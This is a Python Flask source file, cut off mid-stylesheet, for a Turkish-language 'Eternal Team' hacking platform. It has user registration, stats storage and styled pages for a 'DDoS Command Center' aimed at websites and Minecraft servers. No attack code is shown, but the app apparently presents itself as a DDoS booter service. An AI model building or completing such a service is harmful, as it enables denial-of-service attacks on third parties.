from flask import Flask, request, render_template_string, session, redirect, url_for, flash, jsonify
import requests
import socket
import threading
import time
import hashlib
import json
import os
from datetime import datetime
import base64

app = Flask(__name__)
app.secret_key = 'eternal_team_advanced_2025_secret'

# Kullanıcı veritabanı dosyası
USERS_FILE = 'users.json'
LOGS_FILE = 'test_logs.json'
STATS_FILE = 'global_stats.json'

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_logs():
    if os.path.exists(LOGS_FILE):
        with open(LOGS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_logs(logs):
    with open(LOGS_FILE, 'w', encoding='utf-8') as f:
        json.dump(logs, f, indent=2, ensure_ascii=False)

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {'total_tests': 0, 'total_requests': 0, 'total_users': 0}

def save_stats(stats):
    with open(STATS_FILE, 'w', encoding='utf-8') as f:
        json.dump(stats, f, indent=2, ensure_ascii=False)

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# ANA MENÜ HTML
HOMEPAGE_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Eternal Team - Advanced Hacking Platform</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@300;400;500;700;900&family=Share+Tech+Mono:wght@400&display=swap');

  @keyframes neonPulse {
    0%, 100% { text-shadow: 0 0 8px #00ff99, 0 0 20px #00ff99, 0 0 35px #00ff99; }
    50% { text-shadow: 0 0 20px #33ffb8, 0 0 40px #33ffb8, 0 0 60px #33ffb8; }
  }

  @keyframes matrixRain {
    0% { transform: translateY(-100vh); opacity: 1; }
    100% { transform: translateY(100vh); opacity: 0; }
  }

  @keyframes hackScan {
    0%, 100% { transform: translateX(-100%); opacity: 0; }
    50% { transform: translateX(100vw); opacity: 1; }
  }

  @keyframes glitchText {
    0%, 90%, 100% { transform: translate(0); }
    20% { transform: translate(-2px, 2px); }
    40% { transform: translate(-2px, -2px); }
    60% { transform: translate(2px, 2px); }
    80% { transform: translate(2px, -2px); }
  }

  @keyframes typewriter {
    from { width: 0; }
    to { width: 100%; }
  }

  @keyframes blink {
    50% { border-color: transparent; }
  }

  @keyframes slideIn {
    0% { transform: translateY(50px); opacity: 0; }
    100% { transform: translateY(0); opacity: 1; }
  }

  @keyframes circuitPulse {
    0%, 100% { opacity: 0.3; }
    50% { opacity: 1; }
  }

  * {
    box-sizing: border-box;
  }

  body {
    margin: 0; 
    min-height: 100vh;
    background: linear-gradient(135deg, #000000, #1a0033, #001a1a, #0d0d0d);
    background-size: 400% 400%;
    animation: gradientShift 15s ease infinite;
    font-family: 'Orbitron', monospace, sans-serif;
    color: #00ff99;
    overflow-x: hidden;
    position: relative;
  }

  @keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    25% { background-position: 100% 50%; }
    50% { background-position: 50% 100%; }
    75% { background-position: 50% 0%; }
  }

  .matrix-bg {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    z-index: 1;
  }

  .matrix-char {
    position: absolute;
    color: #00ff99;
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    animation: matrixRain 6s linear infinite;
    opacity: 0.4;
  }

  .hack-scan {
    position: fixed;
    top: 0;
    height: 3px;
    width: 200px;
    background: linear-gradient(90deg, transparent, #ff0066, #00ff99, #0099ff, transparent);
    animation: hackScan 8s ease-in-out infinite;
    z-index: 2;
    box-shadow: 0 0 20px #00ff99;
  }

  .circuit-bg {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background-image: 
      linear-gradient(90deg, rgba(0,255,153,0.1) 1px, transparent 1px),
      linear-gradient(180deg, rgba(0,255,153,0.1) 1px, transparent 1px);
    background-size: 50px 50px;
    pointer-events: none;
    z-index: 1;
    animation: circuitPulse 4s ease-in-out infinite;
  }

  .header {
    text-align: center;
    padding: 50px 20px;
    position: relative;
    z-index: 3;
  }

  .logo {
    font-size: 4rem;
    font-weight: 900;
    letter-spacing: 8px;
    animation: neonPulse 3s infinite alternate, glitchText 5s infinite;
    text-transform: uppercase;
    margin-bottom: 20px;
    background: linear-gradient(45deg, #00ff99, #0099ff, #ff0066, #00ff99);
    background-size: 300% 300%;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientShift 3s ease infinite, neonPulse 2s infinite alternate;
  }

  .subtitle {
    font-size: 1.5rem;
    color: #33ffb8;
    margin-bottom: 10px;
    font-weight: 400;
    letter-spacing: 3px;
  }

  .tagline {
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
    color: #004d33;
    margin-bottom: 50px;
    overflow: hidden;
    border-right: 3px solid #00ff99;
    white-space: nowrap;
    width: 0;
    animation: typewriter 4s steps(40) 2s forwards, blink 1s step-end infinite;
  }

  .main-nav {
    display: flex;
    justify-content: center;
    gap: 30px;
    margin: 60px 0;
    flex-wrap: wrap;
  }

  .nav-card {
    background: rgba(0,0,0,0.9);
    border: 3px solid #00ff99;
    border-radius: 20px;
    padding: 40px 30px;
    width: 320px;
    text-align: center;
    transition: all 0.4s ease;
    position: relative;
    overflow: hidden;
    cursor: pointer;
    animation: slideIn 1s ease-out;
    backdrop-filter: blur(10px);
  }

  .nav-card::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: linear-gradient(45deg, transparent, rgba(0,255,153,0.1), transparent);
    transform: rotate(45deg);
    transition: all 0.6s ease;
    opacity: 0;
  }

  .nav-card:hover::before {
    animation: hackScan 1s ease-in-out;
    opacity: 1;
  }

  .nav-card:hover {
    transform: translateY(-10px) scale(1.05);
    box-shadow: 0 20px 40px rgba(0,255,153,0.4);
    border-color: #33ffb8;
  }

  .nav-icon {
    font-size: 4rem;
    margin-bottom: 20px;
    display: block;
    filter: drop-shadow(0 0 10px #00ff99);
  }

  .nav-title {
    font-size: 1.5rem;
    font-weight: 700;
    margin-bottom: 15px;
    color: #00ff99;
    text-transform: uppercase;
    letter-spacing: 2px;
  }

  .nav-desc {
    font-size: 1rem;
    color: #66ffcc;
    line-height: 1.5;
    font-family: 'Share Tech Mono', monospace;
  }

  .stats-panel {
    display: flex;
    justify-content: center;
    gap: 40px;
    margin: 80px 0;
    flex-wrap: wrap;
  }

  .stat-item {
    background: rgba(0,255,153,0.1);
    border: 2px solid #00ff99;
    border-radius: 15px;
    padding: 25px 30px;
    text-align: center;
    min-width: 150px;
    backdrop-filter: blur(5px);
  }

  .stat-number {
    font-size: 2.5rem;
    font-weight: 900;
    color: #00ff99;
    display: block;
    animation: neonPulse 4s infinite alternate;
  }

  .stat-label {
    font-size: 0.9rem;
    color: #33ffb8;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-top: 10px;
  }

  .hacker-images {
    display: flex;
    justify-content: center;
    gap: 30px;
    margin: 60px 0;
    flex-wrap: wrap;
  }

  .hacker-img {
    width: 150px;
    height: 150px;
    border: 3px solid #00ff99;
    border-radius: 15px;
    background: rgba(0,0,0,0.8);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 4rem;
    animation: floatingElements 6s ease-in-out infinite;
    box-shadow: 0 0 20px rgba(0,255,153,0.3);
    filter: drop-shadow(0 0 10px #00ff99);
  }

  @keyframes floatingElements {
    0%, 100% { transform: translateY(0px) rotate(0deg); }
    50% { transform: translateY(-20px) rotate(5deg); }
  }

  .footer {
    text-align: center;
    padding: 40px 20px;
    border-top: 3px solid #00ff99;
    margin-top: 80px;
    background: rgba(0,0,0,0.9);
    backdrop-filter: blur(10px);
  }

  .footer-text {
    color: #004d33;
    font-size: 0.9rem;
    margin-bottom: 20px;
  }

  .social-links {
    display: flex;
    justify-content: center;
    gap: 25px;
  }

  .social-link {
    color: #00ff99;
    font-size: 1.5rem;
    text-decoration: none;
    transition: all 0.3s ease;
    padding: 10px;
    border: 2px solid #00ff99;
    border-radius: 50%;
    width: 50px;
    height: 50px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .social-link:hover {
    color: #001a00;
    background: #00ff99;
    transform: scale(1.2);
    box-shadow: 0 0 20px #00ff99;
  }

  @media (max-width: 768px) {
    .logo { font-size: 2.5rem; }
    .nav-card { width: 280px; margin: 10px; }
    .stats-panel { gap: 20px; }
    .hacker-images { gap: 15px; }
    .hacker-img { width: 120px; height: 120px; font-size: 3rem; }
  }
</style>
<script>
function createMatrixRain() {
  const chars = '0123456789ETERNĀLTEAM01HACK<>[]{}()$#@!%&*';
  const container = document.querySelector('.matrix-bg');

  for(let i = 0; i < 100; i++) {
    const char = document.createElement('div');
    char.className = 'matrix-char';
    char.textContent = chars[Math.floor(Math.random() * chars.length)];
    char.style.left = Math.random() * 100 + 'vw';
    char.style.animationDelay = Math.random() * 6 + 's';
    char.style.animationDuration = (Math.random() * 4 + 3) + 's';
    char.style.fontSize = (Math.random() * 8 + 10) + 'px';
    container.appendChild(char);
  }
}

function navigateTo(page) {
  window.location.href = '/' + page;
}

function updateStats() {
  // Dinamik stats güncelleme
  fetch('/api/stats')
    .then(response => response.json())
    .then(data => {
      document.getElementById('total-tests').textContent = data.total_tests;
      document.getElementById('total-requests').textContent = data.total_requests;
      document.getElementById('total-users').textContent = data.total_users;
    })
    .catch(err => console.log('Stats load error'));
}

window.onload = function() {
  createMatrixRain();
  updateStats();

  // Tagline animation
  document.querySelector('.tagline').style.width = '100%';
}
</script>
</head>
<body>
  <div class="matrix-bg"></div>
  <div class="hack-scan"></div>
  <div class="circuit-bg"></div>

  <div class="header">
    <h1 class="logo">Eternal Team</h1>
    <div class="subtitle">Advanced Hacking Platform</div>
    <div class="tagline">>> Unleashing the power of digital warfare...</div>
  </div>

  <div class="main-nav">
    <div class="nav-card" onclick="navigateTo('auth')">
      <div class="nav-icon">🔐</div>
      <div class="nav-title">Giriş / Kayıt</div>
      <div class="nav-desc">Eternal Team ailesine katıl. Güvenli giriş sistemi ile hesabını oluştur.</div>
    </div>

    <div class="nav-card" onclick="navigateTo('dashboard')">
      <div class="nav-icon">⚔️</div>
      <div class="nav-title">DDoS Test Center</div>
      <div class="nav-desc">Gelişmiş DDoS test araçları. Web siteleri ve Minecraft sunucularını test et.</div>
    </div>

    <div class="nav-card" onclick="navigateTo('tools')">
      <div class="nav-icon">🛠️</div>
      <div class="nav-title">Hacker Tools</div>
      <div class="nav-desc">Port tarama, IP analizi ve diğer ağ araçları. [Yakında]</div>
    </div>
  </div>

  <div class="hacker-images">
    <div class="hacker-img">💀</div>
    <div class="hacker-img">🎭</div>
    <div class="hacker-img">⚡</div>
    <div class="hacker-img">🔥</div>
    <div class="hacker-img">👾</div>
  </div>

  <div class="stats-panel">
    <div class="stat-item">
      <span class="stat-number" id="total-tests">{{ stats.total_tests }}</span>
      <div class="stat-label">Toplam Test</div>
    </div>
    <div class="stat-item">
      <span class="stat-number" id="total-requests">{{ stats.total_requests }}</span>
      <div class="stat-label">Gönderilen İstek</div>
    </div>
    <div class="stat-item">
      <span class="stat-number" id="total-users">{{ stats.total_users }}</span>
      <div class="stat-label">Kayıtlı Hacker</div>
    </div>
  </div>

  <div class="footer">
    <div class="footer-text">
      &copy; 2025 Eternal Team - Advanced Hacking Platform<br>
      Sadece eğitim ve test amaçlı kullanın. Sorumlu hackerlık yapın.
    </div>
    <div class="social-links">
      <a href="https://discord.gg/wDVqZJc8Qn" class="social-link" target="_blank">💬</a>
      <a href="#" class="social-link">🐙</a>
      <a href="#" class="social-link">📧</a>
    </div>
  </div>
</body>
</html>
"""

# KAYIT/GİRİŞ MENÜSÜ HTML
AUTH_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Eternal Team - Secure Access Portal</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@300;400;500;700;900&family=Share+Tech+Mono:wght@400&display=swap');

  @keyframes neonPulse {
    0%, 100% { text-shadow: 0 0 8px #00ff99, 0 0 20px #00ff99, 0 0 35px #00ff99; }
    50% { text-shadow: 0 0 20px #33ffb8, 0 0 40px #33ffb8, 0 0 60px #33ffb8; }
  }

  @keyframes matrixRain {
    0% { transform: translateY(-100vh); opacity: 1; }
    100% { transform: translateY(100vh); opacity: 0; }
  }

  @keyframes securityScan {
    0%, 100% { transform: translateX(-100%); opacity: 0; }
    50% { transform: translateX(100vw); opacity: 1; }
  }

  @keyframes glitchEffect {
    0%, 100% { transform: translate(0); }
    20% { transform: translate(-2px, 2px); }
    40% { transform: translate(-2px, -2px); }
    60% { transform: translate(2px, 2px); }
    80% { transform: translate(2px, -2px); }
  }

  @keyframes slideInFromTop {
    0% { transform: translateY(-50px); opacity: 0; }
    100% { transform: translateY(0); opacity: 1; }
  }

  @keyframes lockAnimation {
    0%, 100% { transform: scale(1) rotate(0deg); }
    50% { transform: scale(1.1) rotate(5deg); }
  }

  * {
    box-sizing: border-box;
  }

  body {
    margin: 0; 
    min-height: 100vh;
    background: linear-gradient(135deg, #000000, #1a1a2e, #16213e, #0f2027);
    background-size: 400% 400%;
    animation: gradientShift 8s ease infinite;
    font-family: 'Orbitron', monospace, sans-serif;
    color: #00ff99;
    overflow-x: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
  }

  @keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
  }

  .matrix-bg {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    z-index: 1;
  }

  .matrix-char {
    position: absolute;
    color: #00ff99;
    font-family: 'Share Tech Mono', monospace;
    font-size: 14px;
    animation: matrixRain 4s linear infinite;
    opacity: 0.3;
  }

  .security-scan {
    position: fixed;
    top: 20%;
    height: 2px;
    width: 150px;
    background: linear-gradient(90deg, transparent, #ff0066, #00ff99, transparent);
    animation: securityScan 5s ease-in-out infinite;
    z-index: 2;
    box-shadow: 0 0 15px #00ff99;
  }

  .side-decorations {
    position: fixed;
    top: 0;
    bottom: 0;
    width: 100px;
    background: linear-gradient(180deg, rgba(0,255,153,0.1), rgba(0,255,153,0.05));
    border: 2px solid rgba(0,255,153,0.3);
    backdrop-filter: blur(10px);
    z-index: 2;
  }

  .side-decorations.left { 
    left: 0; 
    border-right: 3px solid #00ff99;
    border-left: none;
  }
  .side-decorations.right { 
    right: 0; 
    border-left: 3px solid #00ff99;
    border-right: none;
  }

  .decoration-icons {
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 40px 0;
    gap: 30px;
    height: 100%;
    justify-content: space-around;
  }

  .deco-icon {
    width: 50px;
    height: 50px;
    border: 2px solid #00ff99;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 20px;
    color: #00ff99;
    animation: neonPulse 3s infinite alternate;
    background: rgba(0,255,153,0.1);
  }

  .container {
    max-width: 500px;
    background: rgba(0,0,0,0.95);
    border-radius: 25px;
    border: 3px solid #00ff99;
    box-shadow: 0 0 50px #00ff99, inset 0 0 30px rgba(0,255,153,0.1);
    padding: 50px 45px;
    text-align: center;
    position: relative;
    z-index: 3;
    animation: slideInFromTop 1s ease-out;
    backdrop-filter: blur(20px);
  }

  .container::before {
    content: '';
    position: absolute;
    top: -3px; left: -3px; right: -3px; bottom: -3px;
    background: linear-gradient(45deg, #00ff99, #33ffb8, #00ff99, #33ffb8);
    border-radius: 28px;
    z-index: -1;
    animation: glitchEffect 4s infinite;
  }

  .header-security {
    position: absolute;
    top: -20px;
    left: 50%;
    transform: translateX(-50%);
    background: #001a00;
    padding: 8px 25px;
    border: 2px solid #00ff99;
    border-radius: 20px;
    font-size: 14px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: #00ff99;
    animation: neonPulse 2s infinite alternate;
  }

  .logo-section {
    margin-bottom: 40px;
  }

  .main-logo {
    font-size: 3rem;
    margin: 20px 0;
    letter-spacing: 6px;
    animation: neonPulse 3s infinite alternate;
    font-weight: 900;
    text-transform: uppercase;
    background: linear-gradient(45deg, #00ff99, #0099ff, #ff0066);
    background-size: 300% 300%;
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientShift 3s ease infinite;
  }

  .lock-icon {
    font-size: 3rem;
    margin-bottom: 15px;
    animation: lockAnimation 4s ease-in-out infinite;
    filter: drop-shadow(0 0 10px #00ff99);
  }

  .subtitle {
    font-size: 1.2rem;
    color: #33ffb8;
    margin-bottom: 15px;
    font-weight: 400;
    letter-spacing: 2px;
  }

  .access-info {
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9rem;
    color: #004d33;
    margin-bottom: 35px;
  }

  .tab-container {
    display: flex;
    margin: 40px 0 35px;
    border-radius: 18px;
    overflow: hidden;
    border: 2px solid #00ff99;
    background: rgba(0,255,153,0.05);
  }

  .tab {
    flex: 1;
    padding: 18px;
    background: rgba(4,27,20,0.8);
    color: #00ff99;
    cursor: pointer;
    font-weight: 700;
    transition: all 0.4s ease;
    position: relative;
    overflow: hidden;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  .tab::before {
    content: '';
    position: absolute;
    top: 0; left: -100%; right: 0; bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(0,255,153,0.3), transparent);
    transition: left 0.6s ease;
  }

  .tab:hover::before {
    left: 100%;
  }

  .tab.active {
    background: #00ff99;
    color: #001a00;
    box-shadow: 0 0 25px #00ff99;
    font-weight: 800;
  }

  .form-section {
    display: none;
    animation: slideInFromTop 0.5s ease-out;
  }

  .form-section.active {
    display: block;
  }

  label {
    display: block;
    font-weight: 600;
    margin: 25px 0 12px;
    text-align: left;
    color: #33ffb8;
    font-size: 1.1rem;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  input[type=text], input[type=password] {
    width: 100%;
    padding: 18px 20px;
    font-size: 1.1rem;
    border: 2px solid #00ff99;
    border-radius: 15px;
    background: rgba(4,27,20,0.8);
    color: #00ff99;
    outline: none;
    transition: all 0.3s ease;
    font-family: 'Orbitron', monospace;
  }

  input[type=text]:focus, input[type=password]:focus {
    border-color: #33ffb8;
    box-shadow: 0 0 20px #33ffb8;
    background: rgba(4,27,20,0.95);
    transform: scale(1.02);
  }

  button {
    margin-top: 30px;
    width: 100%;
    padding: 18px 0;
    font-size: 1.3rem;
    font-weight: 800;
    border: none;
    border-radius: 18px;
    background: linear-gradient(45deg, #00ff99, #33ffb8);
    color: #001a00;
    cursor: pointer;
    box-shadow: 0 0 25px #00ff99;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 3px;
    font-family: 'Orbitron', monospace;
    position: relative;
    overflow: hidden;
  }

  button::before {
    content: '';
    position: absolute;
    top: 0; left: -100%; right: 0; bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
    transition: left 0.6s ease;
  }

  button:hover::before {
    left: 100%;
  }

  button:hover {
    background: linear-gradient(45deg, #33ffb8, #00ff99);
    box-shadow: 0 0 40px #00ff99;
    transform: translateY(-3px);
  }

  .error {
    color: #ff4444;
    background: rgba(255,68,68,0.15);
    padding: 15px;
    border-radius: 12px;
    margin: 20px 0;
    border: 2px solid #ff4444;
    animation: glitchEffect 0.5s ease-out;
    font-weight: 600;
  }

  .success {
    color: #00ff99;
    background: rgba(0,255,153,0.15);
    padding: 15px;
    border-radius: 12px;
    margin: 20px 0;
    border: 2px solid #00ff99;
    animation: neonPulse 1s ease-out;
    font-weight: 600;
  }

  .back-btn {
    position: absolute;
    top: 20px;
    left: 20px;
    background: rgba(0,255,153,0.1);
    border: 2px solid #00ff99;
    color: #00ff99;
    padding: 12px 20px;
    border-radius: 12px;
    text-decoration: none;
    font-weight: 600;
    transition: all 0.3s ease;
    z-index: 4;
  }

  .back-btn:hover {
    background: #00ff99;
    color: #001a00;
    transform: scale(1.1);
  }

  .footer-info {
    position: absolute;
    bottom: 20px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 12px;
    color: #004d33;
    text-align: center;
    opacity: 0.8;
  }
</style>
<script>
function createMatrixRain() {
  const chars = '01ETERNĀLTEAM01HACK<>[]{}()$#@!%&*';
  const container = document.querySelector('.matrix-bg');

  for(let i = 0; i < 60; i++) {
    const char = document.createElement('div');
    char.className = 'matrix-char';
    char.textContent = chars[Math.floor(Math.random() * chars.length)];
    char.style.left = Math.random() * 100 + 'vw';
    char.style.animationDelay = Math.random() * 4 + 's';
    char.style.animationDuration = (Math.random() * 3 + 2) + 's';
    container.appendChild(char);
  }
}

function showTab(tabName) {
  const sections = document.querySelectorAll('.form-section');
  sections.forEach(section => section.classList.remove('active'));

  const tabs = document.querySelectorAll('.tab');
  tabs.forEach(tab => tab.classList.remove('active'));

  document.getElementById(tabName + '-section').classList.add('active');
  document.getElementById(tabName + '-tab').classList.add('active');
}

window.onload = function() {
  createMatrixRain();
}
</script>
</head>
<body>
  <div class="matrix-bg"></div>
  <div class="security-scan"></div>

  <div class="side-decorations left">
    <div class="decoration-icons">
      <div class="deco-icon">🔐</div>
      <div class="deco-icon">🛡️</div>
      <div class="deco-icon">🔑</div>
      <div class="deco-icon">⚡</div>
      <div class="deco-icon">🎯</div>
    </div>
  </div>

  <div class="side-decorations right">
    <div class="decoration-icons">
      <div class="deco-icon">💀</div>
      <div class="deco-icon">🔥</div>
      <div class="deco-icon">⚔️</div>
      <div class="deco-icon">👾</div>
      <div class="deco-icon">💻</div>
    </div>
  </div>

  <a href="/" class="back-btn">← Ana Menü</a>

  <div class="container">
    <div class="header-security">Secure Access Portal</div>

    <div class="logo-section">
      <div class="lock-icon">🔐</div>
      <h1 class="main-logo">Eternal Team</h1>
      <div class="subtitle">Authorized Access Only</div>
      <div class="access-info">>> Güvenli giriş sistemi aktif...</div>
    </div>

    <div class="tab-container">
      <div class="tab active" id="login-tab" onclick="showTab('login')">Giriş</div>
      <div class="tab" id="register-tab" onclick="showTab('register')">Kayıt</div>
    </div>

    {% with messages = get_flashed_messages() %}
      {% if messages %}
        {% for message in messages %}
          <div class="error">{{ message }}</div>
        {% endfor %}
      {% endif %}
    {% endwith %}

    <!-- Giriş Bölümü -->
    <div class="form-section active" id="login-section">
      <form method="POST" action="/login">
        <label for="username">Kullanıcı Adı:</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Şifre:</label>
        <input type="password" id="password" name="password" required>

        <button type="submit">Sisteme Giriş</button>
      </form>
    </div>

    <!-- Kayıt Bölümü -->
    <div class="form-section" id="register-section">
      <form method="POST" action="/register">
        <label for="reg_username">Kullanıcı Adı:</label>
        <input type="text" id="reg_username" name="username" required>

        <label for="reg_password">Şifre:</label>
        <input type="password" id="reg_password" name="password" required>

        <label for="reg_password2">Şifre Tekrar:</label>
        <input type="password" id="reg_password2" name="password2" required>

        <button type="submit">Eternal Team'e Katıl</button>
      </form>
    </div>
  </div>

  <div class="footer-info">
    &copy; 2025 Eternal Team - Advanced Security System
  </div>
</body>
</html>
"""

# DDOS TEST MENÜSÜ HTML
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Eternal Team - DDoS Command Center</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@300;400;500;700;900&family=Share+Tech+Mono:wght@400&display=swap');

  @keyframes neonPulse {
    0%, 100% { text-shadow: 0 0 8px #00ff99, 0 0 20px #00ff99, 0 0 35px #00ff99; }
    50% { text-shadow: 0 0 20px #33ffb8, 0 0 40px #33ffb8, 0 0 60px #33ffb8; }
  }

  @keyframes matrixRain {
    0% { transform: translateY(-100vh); opacity: 1; }
    100% { transform: translateY(100vh); opacity: 0; }
  }

  @keyframes attackScan {
    0%, 100% { transform: translateX(-100%); opacity: 0; }
    50% { transform: translateX(100vw); opacity: 1; }
  }

  @keyframes dataFlow {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100vw); }
  }

  @keyframes pulseRed {
    0%, 100% { box-shadow: 0 0 15px #ff0066; }
    50% { box-shadow: 0 0 30px #ff0066, 0 0 45px #ff0066; }
  }

  * {
    box-sizing: border-box;
  }

  body {
    margin: 0; 
    min-height: 100vh;
    background: linear-gradient(135deg, #000000, #1a0033, #001a1a, #0d0d0d);
    background-size: 400% 400%;
    animation: gradientShift 10s ease infinite;
    font-family: 'Orbitron', monospace, sans-serif;
    color: #00ff99;
    overflow-x: hidden;
    position: relative;
  }

  @keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    25% { background-position: 100% 50%; }
    50% { background-position: 50% 100%; }
    75% { background-position: 50% 0%; }
  }

  .matrix-bg {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    z-index: 1;
  }

  .matrix-char {
    position: absolute;
    color: #00ff99;
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    animation: matrixRain 5s linear infinite;
    opacity: 0.2;
  }

  .attack-scan {
    position: fixed;
    top: 10%;
    height: 3px;
    width: 250px;
    background: linear-gradient(90deg, transparent, #ff0066, #00ff99, #0099ff, transparent);
    animation: attackScan 6s ease-in-out infinite;
    z-index: 2;
    box-shadow: 0 0 20px #ff0066;
  }

  .data-stream {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    z-index: 1;
  }

  .data-line {
    position: absolute;
    height: 1px;
    background: linear-gradient(90deg, transparent, #00ff99, transparent);
    animation: dataFlow 4s linear infinite;
    opacity: 0.4;
  }

  .header {
    text-align: center;
    padding: 30px 25px;
    border-bottom: 3px solid #00ff99;
    margin-bottom: 30px;
    background: rgba(0,0,0,0.9);
    backdrop-filter: blur(15px);
    position: relative;
    z-index: 3;
  }

  .user-section {
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 20px;
  }

  .user-info {
    color: #00ff99;
    font-size: 1.3rem;
    font-weight: 600;
  }

  .username-highlight {
    color: #33ffb8;
    font-weight: 900;
    text-transform: uppercase;
    letter-spacing: 2px;
    animation: neonPulse 2s infinite alternate;
  }

  .header-buttons {
    display: flex;
    gap: 15px;
    flex-wrap: wrap;
  }

  .header-btn {
    background: linear-gradient(45deg, #ff4444, #ff6b6b);
    color: white;
    padding: 12px 25px;
    border: 2px solid #ff4444;
    border-radius: 15px;
    cursor: pointer;
    text-decoration: none;
    display: inline-block;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1px;
    transition: all 0.3s ease;
    box-shadow: 0 0 15px rgba(255,68,68,0.5);
  }

  .header-btn:hover {
    background: linear-gradient(45deg, #ff6b6b, #ff4444);
    box-shadow: 0 0 25px rgba(255,68,68,0.8);
    transform: translateY(-2px);
  }

  .header-btn.home {
    background: linear-gradient(45deg, #0099ff, #33ccff);
    border-color: #0099ff;
    box-shadow: 0 0 15px rgba(0,153,255,0.5);
  }

  .header-btn.home:hover {
    background: linear-gradient(45deg, #33ccff, #0099ff);
    box-shadow: 0 0 25px rgba(0,153,255,0.8);
  }

  .nav-tabs {
    display: flex;
    justify-content: center;
    margin-bottom: 25px;
    gap: 15px;
    flex-wrap: wrap;
  }

  .nav-tab {
    padding: 15px 30px;
    background: rgba(4,27,20,0.8);
    border: 2px solid #00ff99;
    color: #00ff99;
    cursor: pointer;
    border-radius: 12px;
    transition: all 0.3s ease;
    font-weight: 600;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  .nav-tab.active {
    background: #00ff99;
    color: #001a00;
    box-shadow: 0 0 20px #00ff99;
  }

  .nav-tab:hover {
    transform: translateY(-2px);
    box-shadow: 0 5px 15px rgba(0,255,153,0.3);
  }

  .container {
    max-width: 600px;
    margin: 0 auto 60px;
    background: rgba(0,0,0,0.95);
    border-radius: 20px;
    border: 3px solid #00ff99;
    box-shadow: 0 0 30px #00ff99;
    padding: 40px;
    text-align: center;
    position: relative;
    z-index: 3;
    backdrop-filter: blur(15px);
  }

  .main-section {
    display: none;
  }

  .main-section.active {
    display: block;
  }

  .section-title {
    font-size: 2.5rem;
    margin-bottom: 30px;
    letter-spacing: 4px;
    animation: neonPulse 3s infinite alternate;
    font-weight: 900;
    text-transform: uppercase;
  }

  .tab-container {
    display: flex;
    margin-bottom: 35px;
    border-radius: 15px;
    overflow: hidden;
    border: 2px solid #00ff99;
  }

  .tab {
    flex: 1;
    padding: 18px;
    background: rgba(4,27,20,0.8);
    border: none;
    color: #00ff99;
    cursor: pointer;
    font-weight: 700;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  .tab.active {
    background: #00ff99;
    color: #001a00;
    box-shadow: 0 0 20px #00ff99;
  }

  .form-section {
    display: none;
  }

  .form-section.active {
    display: block;
  }

  .attack-warning {
    background: rgba(255,68,68,0.1);
    border: 2px solid #ff4444;
    border-radius: 15px;
    padding: 20px;
    margin-bottom: 30px;
    color: #ff6666;
    font-weight: 600;
    animation: pulseRed 3s infinite;
  }

  .form-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 20px;
    margin-bottom: 30px;
  }

  .form-group {
    text-align: left;
  }

  .form-group.full {
    grid-column: 1 / -1;
  }

  label {
    display: block;
    font-weight: 600;
    font-size: 1rem;
    margin: 0 0 10px;
    color: #33ffb8;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  input[type=text], input[type=number] {
    width: 100%;
    padding: 15px 18px;
    font-size: 1.1rem;
    border: 2px solid #00ff99;
    border-radius: 12px;
